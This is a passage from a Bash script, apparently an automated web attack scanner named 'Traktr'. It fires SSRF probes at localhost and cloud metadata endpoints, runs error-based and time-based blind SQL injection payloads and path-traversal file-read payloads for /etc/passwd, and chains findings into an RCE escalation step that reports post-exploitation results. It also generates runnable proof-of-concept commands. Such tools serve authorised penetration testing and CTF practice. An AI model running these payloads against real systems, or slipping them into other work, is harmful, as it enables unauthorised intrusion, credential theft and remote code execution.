          local bl_md5; bl_md5=$(md5sum "$bl_file" 2>/dev/null | cut -d' ' -f1)
          rm -f "$bl_file"

          # Test localhost payloads
          for payload in "${ssrf_payloads[@]}"; do
            $found_ssrf && break
            local resp_file; resp_file=$(mktemp "${OUTDIR}/ssrf_resp_XXXXX")
            local encoded; encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
            _curl "${base_url}?${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
            local resp_size; resp_size=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
            local resp_md5; resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)
            local delta=$(( ${resp_size:-0} - ${bl_size:-0} ))
            # Different response from baseline + size change OR content match
            if [[ "$resp_md5" != "$bl_md5" ]] && { [[ ${delta#-} -gt 100 ]] || grep -qiP "$ssrf_sigs" "$resp_file" 2>/dev/null; }; then
              local conf="MEDIUM"
              grep -qiP "$ssrf_sigs" "$resp_file" 2>/dev/null && conf="HIGH"
              local _esc_payload="${payload//\"/\\\"}"
              echo "{\"type\":\"ssrf\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"$conf\",\"signals\":\"length_delta(${delta})\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/ssrf.json"
              echo -e "\033[1;33m  [!!] SSRF: ${url} (${param}) payload=${payload} [$conf]\033[0m" >&2
              found_ssrf=true
            fi
            rm -f "$resp_file"
          done

          # Test cloud metadata endpoints
          if ! $found_ssrf; then
            for payload in "${ssrf_meta_payloads[@]}"; do
              $found_ssrf && break
              local resp_file; resp_file=$(mktemp "${OUTDIR}/ssrf_meta_XXXXX")
              local encoded; encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
              _curl "${base_url}?${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
              local resp_size; resp_size=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
              local resp_md5; resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)
              if [[ "$resp_md5" != "$bl_md5" ]] && [[ "$resp_size" -gt 50 ]]; then
                if grep -qiP 'ami-id|instance-id|computeMetadata|privateIp|accountId|hostname' "$resp_file" 2>/dev/null; then
                  local _esc_payload="${payload//\"/\\\"}"
                  echo "{\"type\":\"ssrf_cloud_metadata\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"HIGH\",\"proof\":\"Cloud metadata accessible\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/ssrf.json"
                  echo -e "\033[1;31m  [!!] SSRF Cloud Metadata: ${url} (${param}) payload=${payload} [HIGH]\033[0m" >&2
                  found_ssrf=true
                fi
              fi
              rm -f "$resp_file"
            done
          fi
        done < <(head -20 "$ssrf_candidates")
      ) &
      pids+=($!)
    fi
    rm -f "$ssrf_candidates"
  fi

  # ── SQL Injection (error-based + time-based blind) ──
  if [[ -s "${OUTDIR}/active_params.txt" ]]; then
    _tool_cmd "sqli-detect" "SQL injection detection (error + time-based blind)"
    (
      : > "${OUTDIR}/vuln/sqli.json"
      # Error-based payloads
      local sqli_error_payloads=("'" "'\"" "' OR '1'='1" "1' OR '1'='1'--" "1' ORDER BY 100--" "1 UNION SELECT NULL--" "' UNION SELECT NULL,NULL--" "' UNION SELECT NULL,NULL,NULL--" "') OR ('1'='1" "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--" "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--")
      # Time-based blind payloads (MySQL, MSSQL, PostgreSQL, Oracle)
      local sqli_time_payloads=("' AND SLEEP(3)--" "' AND SLEEP(3)#" "1 AND SLEEP(3)--" "'; WAITFOR DELAY '0:0:3'--" "' AND PG_SLEEP(3)--" "1; SELECT PG_SLEEP(3)--" "' AND (SELECT * FROM (SELECT SLEEP(3))a)--" "' AND IF(1=1,SLEEP(3),0)--")
      local sqli_sigs='SQL syntax|mysql_fetch|mysql_num|mysql_query|mysql_|ORA-[0-9]|PG::|SQLITE_|ODBC|syntax error|Unclosed quotation|unterminated|sql error|database error|query failed|division by zero|pg_query|pg_exec|SQLite3::|Microsoft.*ODBC|JDBC|JET Database|Access Database Engine|mysql_connect|PDOException|Illuminate\\\\Database|SQLSTATE\[|quoted string not properly terminated|unexpected end of SQL|supplied argument is not a valid MySQL|Column count doesn.t match|Unknown column|Table.*doesn.t exist|You have an error in your SQL|Warning.*mysql_|Warning.*pg_|Warning.*sqlite|Warning.*oci_|Warning.*mssql_|Incorrect syntax near|Conversion failed when converting|Invalid column name|Invalid object name'

      while IFS='|' read -r url param _ method _; do
        [[ -z "$url" ]] || [[ -z "$param" ]] && continue
        local base_url="${url%%\?*}"
        local found_sqli=false

        # Phase 1: Error-based detection
        for payload in "${sqli_error_payloads[@]}"; do
          $found_sqli && break
          local encoded
          encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"\"\"$payload\"\"\"))" 2>/dev/null || echo "$payload")
          local resp_file; resp_file=$(mktemp "${OUTDIR}/sqli_resp_XXXXX")
          if [[ "${method:-GET}" == "POST" ]]; then
            _curl "${base_url}" -X POST -d "${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
          else
            _curl "${base_url}?${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
          fi
          if grep -qiP "$sqli_sigs" "$resp_file" 2>/dev/null; then
            local proof; proof=$(grep -oiP "$sqli_sigs" "$resp_file" 2>/dev/null | head -1 | head -c 80)
            local _esc_proof="${proof//\"/\\\"}"
            local _esc_payload="${payload//\"/\\\"}"
            echo "{\"type\":\"sqli\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"HIGH\",\"proof\":\"${_esc_proof}\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/sqli.json"
            echo -e "\033[1;31m  [!!] SQLi (error-based): ${url} (${param}) proof='${proof}' [HIGH]\033[0m" >&2
            found_sqli=true
          fi
          rm -f "$resp_file"
        done

        # Phase 2: Time-based blind detection (only if error-based didn't find anything)
        if ! $found_sqli; then
          # Get baseline response time
          local bl_time
          bl_time=$(_curl "${base_url}?${param}=1" -o /dev/null -w '%{time_total}' 2>/dev/null) || bl_time="0.5"
          for payload in "${sqli_time_payloads[@]}"; do
            $found_sqli && break
            local encoded
            encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"\"\"$payload\"\"\"))" 2>/dev/null || echo "$payload")
            local t_start t_end t_elapsed
            t_start=$(date +%s%N 2>/dev/null || date +%s)
            _curl "${base_url}?${param}=${encoded}" -o /dev/null 2>/dev/null || continue
            t_end=$(date +%s%N 2>/dev/null || date +%s)
            t_elapsed=$(( (t_end - t_start) / 1000000000 )) 2>/dev/null || t_elapsed=0
            # If response took >= 2.5s and baseline was < 1.5s, likely time-based SQLi
            if [[ "$t_elapsed" -ge 2 ]]; then
              local bl_int; bl_int=$(awk "BEGIN{printf \"%d\", ${bl_time}+0.5}" 2>/dev/null) || bl_int=1
              if [[ "$t_elapsed" -ge $(( bl_int + 2 )) ]] || [[ "$t_elapsed" -ge 3 ]]; then
                local _esc_payload="${payload//\"/\\\"}"
                echo "{\"type\":\"sqli_blind\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"MEDIUM\",\"proof\":\"Response delayed ${t_elapsed}s (baseline: ${bl_time}s)\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/sqli.json"
                echo -e "\033[1;33m  [!!] SQLi (time-based blind): ${url} (${param}) delay=${t_elapsed}s [MEDIUM]\033[0m" >&2
                found_sqli=true
              fi
            fi
          done
        fi
      done < <(head -30 "${OUTDIR}/active_params.txt")
    ) &
    pids+=($!)
  fi

  # Wait for all scanners (no hard deadline — let them finish for thorough analysis)
  local vuln_deadline=$(( $(date +%s) + 900 ))  # 15-min safety net
  _log "  Waiting for ${#pids[@]} vuln scanners..."
  _spin "Running ${#pids[@]} scanners in parallel (nuclei, LFI, XSS, SQLi, SSRF, commix)..."
  for pid in "${pids[@]}"; do
    while kill -0 "$pid" 2>/dev/null; do
      if [[ $(date +%s) -ge $vuln_deadline ]]; then
        _debug "Safety deadline reached, killing remaining scanners"
        for kpid in "${pids[@]}"; do _kill_tree_hard "$kpid"; done
        break 2
      fi
      sleep 2
    done
    wait "$pid" 2>/dev/null || true
  done
  _spin_stop

  # ── MERGE FINDINGS ──
  _merge_findings
  _save_state "vulntest"
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 5.5: RCE ESCALATION — Chain vulns for Remote Code Execution
# ═══════════════════════════════════════════════════════════════════════════
step5_5_rce_escalation() {
  _log "[*] STEP 5.5: RCE Escalation Engine"

  # Only run if we have LFI or SQLi findings to chain
  local has_lfi=false has_sqli=false has_upload=false
  [[ -f "${OUTDIR}/vuln/lfi.json" ]] && [[ -s "${OUTDIR}/vuln/lfi.json" ]] && has_lfi=true
  [[ -f "${OUTDIR}/vuln/sqli.json" ]] && [[ -s "${OUTDIR}/vuln/sqli.json" ]] && has_sqli=true

  # Check if we discovered upload forms during crawl/param discovery
  if grep -qiE 'type.*file|upload|multipart|enctype' "${OUTDIR}/all_endpoints.txt" "${OUTDIR}/active_params.txt" 2>/dev/null; then
    has_upload=true
  fi
  # Also check HTML sources for file upload forms
  if find "${OUTDIR}" -name '*.html' -o -name 'crawl_*.txt' 2>/dev/null | \
     xargs grep -liqE 'type\s*=\s*["\x27]file["\x27]|enctype\s*=\s*["\x27]multipart' 2>/dev/null; then
    has_upload=true
  fi

  if ! $has_lfi && ! $has_sqli; then
    _log "  No LFI/SQLi findings to chain — skipping RCE escalation"
    return
  fi

  _log "  LFI=$has_lfi | SQLi=$has_sqli | Upload forms=$has_upload"

  if declare -f rce_escalate &>/dev/null; then
    : > "${OUTDIR}/vuln/rce.json"
    rce_escalate "$OUTDIR" || _warn "RCE engine returned non-zero (some chains may have failed)"

    # Merge RCE findings into main findings
    if [[ -f "${OUTDIR}/vuln/rce.json" ]] && [[ -s "${OUTDIR}/vuln/rce.json" ]]; then
      local rce_count
      rce_count=$(wc -l < "${OUTDIR}/vuln/rce.json" 2>/dev/null || echo 0)
      if [[ "$rce_count" -gt 0 ]]; then
        _ok "RCE findings: $rce_count — re-merging all findings"
        _merge_findings
      fi
    fi
  else
    _warn "RCE engine not available (src/intel/rce_engine.sh missing)"
  fi

  _save_state "rce"
}

# ── Basic LFI test (inline fallback until Phase 3 lfi_engine.sh) ──────────
_lfi_basic_test() {
  local payloads=(
    "../../../../etc/passwd"
    "..%2f..%2f..%2f..%2fetc/passwd"
    "....//....//....//....//etc/passwd"
    "/etc/passwd"
    "../../../../windows/win.ini"
    "..%252f..%252f..%252f..%252fetc/passwd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
  )
  local sigs=("root:x:0:" "root:\*:0:" "\[extensions\]" "\[fonts\]" "PD9waH")

  while IFS='|' read -r url param source method _; do
    [[ -z "$url" ]] || [[ -z "$param" ]] && continue

    # Baseline request
    local baseline_size
    baseline_size=$(_curl "${url}?${param}=traktr_safe_canary" -o /dev/null -w '%{size_download}' 2>/dev/null) || continue
    [[ -z "$baseline_size" ]] && baseline_size=0

    for payload in "${payloads[@]}"; do
      local encoded; encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$payload" 2>/dev/null || echo "$payload")
      local test_url="${url}?${param}=${encoded}"
      local tmpfile; tmpfile=$(mktemp)
      local resp_code
      resp_code=$(_curl "$test_url" -o "$tmpfile" -w '%{http_code}|%{size_download}' 2>/dev/null) || { rm -f "$tmpfile"; continue; }
      local status="${resp_code%%|*}"
      local size="${resp_code##*|}"

      # Skip if curl failed entirely (000 = connection error)
      [[ "$status" == "000" ]] && { rm -f "$tmpfile"; continue; }

      local signals=0 signal_list=""

      # Signal 1: Content signature match
      for sig in "${sigs[@]}"; do
        if grep -qP "$sig" "$tmpfile" 2>/dev/null; then
          ((signals++)) || true
          signal_list+="content_match,"
          break
        fi
      done

      # Signal 2: Size delta
      local delta=$(( ${size:-0} - ${baseline_size:-0} ))
      [[ ${delta#-} -gt 200 ]] && { ((signals++)) || true; signal_list+="length_delta,"; }

      # Signal 3: Status change (error-based)
      [[ "$status" == "500" ]] && { ((signals++)) || true; signal_list+="status_500,"; }

      if [[ $signals -ge 1 ]]; then
        local conf="LOW"
        # Require content_match for HIGH; size_delta alone = MEDIUM
        if [[ $signals -ge 2 ]] && [[ "$signal_list" == *"content_match"* ]]; then
          conf="HIGH"
        elif [[ $signals -ge 1 ]]; then
          conf="MEDIUM"
        fi
        local prefix=""; [[ "$OSCP" == true ]] && prefix="POTENTIAL "
        local proof; proof=$(grep -oP -m1 'root:x:0:[^\n]{0,60}|\[extensions\][^\n]{0,40}|PD9waH[^\n]{0,40}' "$tmpfile" 2>/dev/null || echo "size_delta=$delta")

        echo "{\"type\":\"${prefix}lfi\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"$payload\",\"confidence\":\"$conf\",\"signals\":$signals,\"signal_list\":\"${signal_list%,}\",\"proof\":\"$(echo "$proof" | head -c 100)\",\"curl\":\"curl -sk '${test_url}'\"}"
        echo -e "\033[1;33m  [!!] LFI: ${url} (${param}) [$conf] signals=${signals}\033[0m" >&2
        _json_event "vuln_found" "{\"type\":\"lfi\",\"url\":\"$url\",\"confidence\":\"$conf\"}"

        # If confirmed (2+ signals), no need to test more payloads on this param
        [[ $signals -ge 2 ]] && { rm -f "$tmpfile"; break; }
      fi
      rm -f "$tmpfile"
    done
  done < "${OUTDIR}/lfi_candidates.txt"
}

# ── Merge all vulnerability findings ──────────────────────────────────────
_merge_findings() {
  _log "  Merging all findings..."
  local merged="${OUTDIR}/findings.json"
  local tmpmerge; tmpmerge=$(mktemp)

  # Nuclei
  if [[ -f "${OUTDIR}/vuln/nuclei.json" ]] && [[ -s "${OUTDIR}/vuln/nuclei.json" ]]; then
    # Normalize nuclei output to our format
    jq -c '{type: .info.name, severity: .info.severity, url: .url, matched_at: .matched_at, curl: ("curl -sk \x27" + .url + "\x27"), confidence: (if .info.severity == "critical" or .info.severity == "high" then "HIGH" elif .info.severity == "medium" then "MEDIUM" else "LOW" end)}' \
      "${OUTDIR}/vuln/nuclei.json" >> "$tmpmerge" 2>/dev/null || true
  fi

  # LFI
  [[ -f "${OUTDIR}/vuln/lfi.json" ]] && [[ -s "${OUTDIR}/vuln/lfi.json" ]] && \
    cat "${OUTDIR}/vuln/lfi.json" >> "$tmpmerge" 2>/dev/null || true

  # XSS
  if [[ -f "${OUTDIR}/vuln/xss.txt" ]] && [[ -s "${OUTDIR}/vuln/xss.txt" ]]; then
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue
      local prefix=""; [[ "$OSCP" == true ]] && prefix="POTENTIAL "
      echo "{\"type\":\"${prefix}xss\",\"detail\":\"$(echo "$line" | sed 's/"/\\"/g' | head -c 200)\",\"confidence\":\"MEDIUM\"}"
    done < "${OUTDIR}/vuln/xss.txt" >> "$tmpmerge" 2>/dev/null || true
  fi

  # Open Redirects
  [[ -f "${OUTDIR}/vuln/redirects.json" ]] && [[ -s "${OUTDIR}/vuln/redirects.json" ]] && \
    cat "${OUTDIR}/vuln/redirects.json" >> "$tmpmerge" 2>/dev/null || true

  # SSRF
  [[ -f "${OUTDIR}/vuln/ssrf.json" ]] && [[ -s "${OUTDIR}/vuln/ssrf.json" ]] && \
    cat "${OUTDIR}/vuln/ssrf.json" >> "$tmpmerge" 2>/dev/null || true

  # SQLi
  [[ -f "${OUTDIR}/vuln/sqli.json" ]] && [[ -s "${OUTDIR}/vuln/sqli.json" ]] && \
    cat "${OUTDIR}/vuln/sqli.json" >> "$tmpmerge" 2>/dev/null || true

  # RCE chain findings
  [[ -f "${OUTDIR}/vuln/rce.json" ]] && [[ -s "${OUTDIR}/vuln/rce.json" ]] && \
    cat "${OUTDIR}/vuln/rce.json" >> "$tmpmerge" 2>/dev/null || true

  # Commix (command injection)
  if [[ -d "${OUTDIR}/vuln/commix_out" ]]; then
    find "${OUTDIR}/vuln/commix_out" -name '*.txt' -size +0c 2>/dev/null | while IFS= read -r cfile; do
      local curl_line
      curl_line=$(grep -oP 'http[^\s]+' "$cfile" 2>/dev/null | head -1) || true
      [[ -n "$curl_line" ]] && echo "{\"type\":\"command_injection\",\"url\":\"$curl_line\",\"confidence\":\"HIGH\",\"proof\":\"commix confirmed\",\"curl\":\"commix -u '$curl_line' --batch\"}"
    done >> "$tmpmerge" 2>/dev/null || true
  fi

  # Convert to JSON array
  if [[ -s "$tmpmerge" ]]; then
    jq -s '.' "$tmpmerge" > "$merged" 2>/dev/null || \
      { echo "["; sed 's/$/,/' "$tmpmerge" | sed '$ s/,$//' ; echo "]"; } > "$merged"
  else
    echo "[]" > "$merged"
  fi
  rm -f "$tmpmerge"

  local count; count=$(jq 'length' "$merged" 2>/dev/null || echo 0)
  _ok "Total findings: $count"
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 6: REPORTING
# ═══════════════════════════════════════════════════════════════════════════
step6_report() {
  _step_bar 6 6 "Report Generation"
  _log "[*] STEP 6: Generating Report"
  local findings="${OUTDIR}/findings.json"
  local duration=$(( $(date +%s) - SCAN_START ))
  local total_findings; total_findings=$(jq 'length' "$findings" 2>/dev/null || echo 0)
  local total_endpoints; total_endpoints=$(wc -l < "${OUTDIR}/all_endpoints.txt" 2>/dev/null || echo 0)
  local total_params; total_params=$(wc -l < "${OUTDIR}/active_params.txt" 2>/dev/null || echo 0)
  local total_secrets; total_secrets=$(jq 'length' "${OUTDIR}/secrets.json" 2>/dev/null || echo 0)

  # ── REPORT.md ──
  {
    cat << REOF
# Traktr Scan Report

| Field | Value |
|-------|-------|
| **Target** | \`${TARGET}\` |
| **Date** | $(date '+%Y-%m-%d %H:%M:%S') |
| **Duration** | ${duration}s |
| **Mode** | $([[ "$OSCP" == true ]] && echo "OSCP-Safe" || echo "Standard")$([[ "$STEALTH" == true ]] && echo " / Stealth" || true) |
| **WAF** | ${WAF_DETECTED} |
| **Framework** | ${FRAMEWORK} |
| **Endpoints** | ${total_endpoints} |
| **Parameters** | ${total_params} |
| **Requests** | ${REQUEST_COUNT} |
| **Findings** | ${total_findings} |
| **Secrets** | ${total_secrets} |

---

## Findings

REOF

    if [[ "$total_findings" -gt 0 ]]; then
      # HIGH confidence first
      for conf_level in HIGH MEDIUM LOW; do
        local conf_count; conf_count=$(jq "[.[] | select(.confidence == \"$conf_level\")] | length" "$findings" 2>/dev/null || echo 0)
        [[ "$conf_count" -eq 0 ]] && continue
        echo "### $conf_level Confidence ($conf_count)"
        echo ""
        jq -r ".[] | select(.confidence == \"$conf_level\") | \"#### \(.type // \"unknown\")\\n- **URL:** \`\(.url // .matched_at // \"N/A\")\`\\n- **Param:** \`\(.param // \"N/A\")\`\\n- **Payload:** \`\(.payload // \"N/A\")\`\\n- **Proof:** \(.proof // .detail // \"See findings.json\")\\n- **PoC:** \`\(.curl // \"N/A\")\`\\n\"" \
          "$findings" 2>/dev/null || true
      done
    else
      echo "_No findings above confidence threshold._"
    fi

    if [[ "$total_secrets" -gt 0 ]]; then
      echo ""
      echo "---"
      echo ""
      echo "## Secrets Detected ($total_secrets)"
      echo ""
      jq -r '.[] | "- **\(.type):** \(.value_redacted) in \(.location) [\(.confidence)]"' \
        "${OUTDIR}/secrets.json" 2>/dev/null || true
    fi

    echo ""
    echo "---"
    echo ""
    echo "## Discovered Endpoints ($total_endpoints)"
    echo ""
    echo "| # | URL |"
    echo "|---|-----|"
    local _ep_num=0
    head -50 "${OUTDIR}/all_endpoints_paths.txt" 2>/dev/null | while IFS= read -r ep; do
      ((_ep_num++)) || true
      echo "| ${_ep_num} | \`${ep}\` |"
    done
    [[ "$total_endpoints" -gt 50 ]] && echo "" && echo "_... and $((total_endpoints - 50)) more (see all_endpoints.txt)_"

    echo ""
    echo "---"
    echo ""
    echo "## Discovered Parameters ($total_params)"
    echo ""
    echo "| Endpoint | Parameter | Method | Source |"
    echo "|----------|-----------|--------|--------|"
    head -50 "${OUTDIR}/active_params.txt" 2>/dev/null | while IFS='|' read -r p_url p_param p_source p_method _; do
      [[ -z "$p_param" ]] && continue
      echo "| \`${p_url}\` | **${p_param}** | ${p_method:-GET} | ${p_source:-?} |"
    done
    [[ "$total_params" -gt 50 ]] && echo "" && echo "_... and $((total_params - 50)) more (see active_params.txt)_"

  } > "${OUTDIR}/REPORT.md"

  # ── poc_commands.txt ──
  if [[ -f "$findings" ]]; then
    {
      echo "#!/usr/bin/env bash"
      echo "# Traktr PoC Commands -- ${TARGET}"
      echo "# Generated: $(date)"
      echo "# WARNING: Review each command before running"
      echo ""
      jq -r '.[] | select(.curl != null) | "# " + (.type // "unknown") + " [" + (.confidence // "?") + "]\n" + .curl + "\n"' \
        "$findings" 2>/dev/null || true
    } > "${OUTDIR}/poc_commands.txt"
    chmod +x "${OUTDIR}/poc_commands.txt"
  fi

  # ── scan_summary.txt ──
  cat > "${OUTDIR}/scan_summary.txt" << SUMEOF
Traktr Scan Summary
====================
Target:      ${TARGET}
Completed:   $(date '+%Y-%m-%d %H:%M:%S')
Duration:    ${duration}s
Requests:    ${REQUEST_COUNT}
Endpoints:   ${total_endpoints}
Parameters:  ${total_params}
Findings:    ${total_findings}
Secrets:     ${total_secrets}
WAF:         ${WAF_DETECTED}
Framework:   ${FRAMEWORK}
SUMEOF

  # ── HTML Report (from reporter.sh) ──
  if declare -f generate_html_report &>/dev/null; then
    generate_html_report "$OUTDIR"
    _debug "HTML report generated: ${OUTDIR}/REPORT.html"
  fi

  # ── Post-scan plugin hook ──
  if declare -f run_hook &>/dev/null; then
    run_hook "post_scan" "{\"target\":\"${TARGET}\",\"outdir\":\"${OUTDIR}\",\"findings_count\":${total_findings}}"
  fi

  _save_state "complete"

  # ── Terminal Summary ──
  local dur_min=$(( duration / 60 )) dur_sec=$(( duration % 60 ))
  local high; high=$(jq '[.[] | select(.confidence == "HIGH")] | length' "$findings" 2>/dev/null || echo 0)
  local med; med=$(jq '[.[] | select(.confidence == "MEDIUM")] | length' "$findings" 2>/dev/null || echo 0)
  local low; low=$(jq '[.[] | select(.confidence == "LOW")] | length' "$findings" 2>/dev/null || echo 0)
  local rce_count=0
  [[ -f "${OUTDIR}/vuln/rce.json" ]] && rce_count=$(wc -l < "${OUTDIR}/vuln/rce.json" 2>/dev/null || echo 0)

  printf '\n' >&2
  printf '\033[1;36m  ╔══════════════════════════════════════════════════════════════╗\033[0m\n' >&2
  printf '\033[1;36m  ║                    TRAKTR SCAN COMPLETE                      ║\033[0m\n' >&2
  printf '\033[1;36m  ╠══════════════════════════════════════════════════════════════╣\033[0m\n' >&2
  printf '\033[1;36m  ║\033[0m  Target:    %-48s\033[1;36m║\033[0m\n' "$TARGET" >&2
  printf '\033[1;36m  ║\033[0m  Duration:  %dm %ds  │  Requests: %-24s\033[1;36m║\033[0m\n' "$dur_min" "$dur_sec" "${REQUEST_COUNT}" >&2
  printf '\033[1;36m  ║\033[0m  WAF: %-8s Framework: %-8s Mode: %-17s\033[1;36m║\033[0m\n' "${WAF_DETECTED}" "${FRAMEWORK}" "$([[ "$OSCP" == true ]] && echo "OSCP-Safe" || echo "Standard")" >&2
  printf '\033[1;36m  ╠══════════════════════════════════════════════════════════════╣\033[0m\n' >&2
  printf '\033[1;36m  ║\033[0m  Endpoints: \033[1;37m%-6s\033[0m  Parameters: \033[1;37m%-6s\033[0m  Secrets: \033[1;37m%-8s\033[0m\033[1;36m║\033[0m\n' "${total_endpoints}" "${total_params}" "${total_secrets}" >&2
  printf '\033[1;36m  ║\033[0m  Findings:  \033[1;31m%-6s\033[0m  HIGH: \033[1;31m%-5s\033[0m MED: \033[1;33m%-5s\033[0m LOW: \033[2m%-5s\033[0m\033[1;36m║\033[0m\n' "${total_findings}" "${high}" "${med}" "${low}" >&2
  [[ "$rce_count" -gt 0 ]] && printf '\033[1;36m  ║\033[0m  \033[1;31m★ RCE CHAINS: %-47s\033[0m\033[1;36m║\033[0m\n' "${rce_count} achieved!" >&2
  printf '\033[1;36m  ╚══════════════════════════════════════════════════════════════╝\033[0m\n' >&2

  # ── Findings Detail ──
  if [[ "$total_findings" -gt 0 ]]; then
    printf '\n' >&2
    printf '  \033[1;36m┌─── Findings (%s) ─────────────────────────────────────────\033[0m\n' "$total_findings" >&2
    printf '  \033[1;36m│ %-8s %-22s %-30s %-10s\033[0m\n' "LEVEL" "TYPE" "URL" "PARAM" >&2
    printf '  \033[1;36m│ %s\033[0m\n' "──────── ────────────────────── ────────────────────────────── ──────────" >&2

    jq -r '.[] | "\(.confidence // "?")|\(.type // "unknown")|\(.url // .matched_at // "N/A")|\(.param // "-")|\(.proof // .detail // "")|\(.curl // "")"' \
      "$findings" 2>/dev/null | sort -t'|' -k1,1r | while IFS='|' read -r conf ftype furl fparam fproof fcurl; do
        local color='\033[1;33m'; local icon="◆"
        [[ "$conf" == "HIGH" ]] && color='\033[1;31m' && icon="●"
        [[ "$conf" == "LOW" ]] && color='\033[2m' && icon="○"
        local short_url="${furl#http*://}"
        [[ ${#short_url} -gt 28 ]] && short_url="${short_url:0:25}..."
        printf "  │ ${color}%-8s\033[0m %-22s \033]8;;%s\033\\%-30s\033]8;;\033\\ %-10s\n" "[${conf}]" "$ftype" "$furl" "$short_url" "$fparam" >&2
        [[ -n "$fproof" ]] && [[ "$fproof" != "null" ]] && printf '  │   \033[1;32mProof: %s\033[0m\n' "${fproof:0:80}" >&2
        [[ -n "$fcurl" ]] && [[ "$fcurl" != "null" ]] && printf '  │   \033[2mPoC: %s\033[0m\n' "${fcurl:0:120}" >&2
      done
    printf '  \033[1;36m└──────────────────────────────────────────────────────────────\033[0m\n' >&2
  fi

  # ── RCE Chain Results ──
  if [[ -d "${OUTDIR}/rce" ]]; then
    local src_count; src_count=$(wc -l < "${OUTDIR}/rce/source_files.txt" 2>/dev/null || echo 0)
    local inc_count; inc_count=$(wc -l < "${OUTDIR}/rce/include_endpoints.txt" 2>/dev/null || echo 0)
    local upl_count; upl_count=$(wc -l < "${OUTDIR}/rce/upload_endpoints.txt" 2>/dev/null || echo 0)
    if [[ "$src_count" -gt 0 ]] || [[ "$inc_count" -gt 0 ]] || [[ "$upl_count" -gt 0 ]]; then
      printf '\n' >&2
      printf '  \033[1;35m┌─── RCE Intel ─────────────────────────────────────────────\033[0m\n' >&2
      printf '  \033[1;35m│\033[0m Source files read: %s | Include endpoints: %s | Upload targets: %s\n' "$src_count" "$inc_count" "$upl_count" >&2
      [[ -s "${OUTDIR}/rce/source_files.txt" ]] && while IFS= read -r sf; do
        printf '  \033[1;35m│\033[0m   \033[2mSource: %s\033[0m\n' "$sf" >&2
      done < "${OUTDIR}/rce/source_files.txt"
      [[ -s "${OUTDIR}/rce/filter_logic.txt" ]] && while IFS='|' read -r fp fl; do
        printf '  \033[1;35m│\033[0m   \033[1;33mFilter: %s → %s\033[0m\n' "$fp" "$fl" >&2
      done < "${OUTDIR}/rce/filter_logic.txt"
      if [[ -f "${OUTDIR}/rce/rce_chain.txt" ]]; then
        printf '  \033[1;35m│\033[0m \033[1;31m★ RCE CHAIN ACHIEVED\033[0m\n' >&2
        IFS='|' read -r _rurl _rparam _renc < "${OUTDIR}/rce/rce_chain.txt"
        printf '  \033[1;35m│\033[0m   URL:   %s\n' "$_rurl" >&2
        printf '  \033[1;35m│\033[0m   Param: %s\n' "$_rparam" >&2
        [[ -f "${OUTDIR}/rce/rce_uid.txt" ]] && printf '  \033[1;35m│\033[0m   \033[1;31mID: %s\033[0m\n' "$(cat "${OUTDIR}/rce/rce_uid.txt" 2>/dev/null)" >&2
      fi
      if [[ -f "${OUTDIR}/rce/post_exploit.txt" ]]; then
        printf '  \033[1;35m│\033[0m \033[1;31mPost-Exploitation:\033[0m\n' >&2
        grep '^FLAG:' "${OUTDIR}/rce/post_exploit.txt" 2>/dev/null | while IFS= read -r flag_line; do
          printf '  \033[1;35m│\033[0m   \033[1;31m★ %s\033[0m\n' "$flag_line" >&2
        done
        grep '^ID:' "${OUTDIR}/rce/post_exploit.txt" 2>/dev/null | head -1 | while IFS= read -r id_line; do
          printf '  \033[1;35m│\033[0m   %s\n' "$id_line" >&2
        done
        grep '^Hostname:' "${OUTDIR}/rce/post_exploit.txt" 2>/dev/null | head -1 | while IFS= read -r h_line; do
          printf '  \033[1;35m│\033[0m   %s\n' "$h_line" >&2
        done
      fi
      printf '  \033[1;35m└──────────────────────────────────────────────────────────────\033[0m\n' >&2
    fi
  fi

  [[ "$total_secrets" -gt 0 ]] && {
    printf '\n  \033[1;31m┌─── Secrets Detected (%s) ────────────────────────────────\033[0m\n' "$total_secrets" >&2
    jq -r '.[] | "  \033[1;31m│\033[0m  [\(.confidence)] \(.type): \(.value_redacted) in \(.location)"' \
      "${OUTDIR}/secrets.json" 2>/dev/null | head -10 >&2
    printf '  \033[1;31m└──────────────────────────────────────────────────────────────\033[0m\n' >&2
  } || true

  # ── Discovered endpoints ──
  if [[ "$total_endpoints" -gt 0 ]]; then
    printf '\n' >&2
    printf '  \033[1;36m┌─── Discovered Endpoints (%s) ──────────────────────────────\033[0m\n' "$total_endpoints" >&2
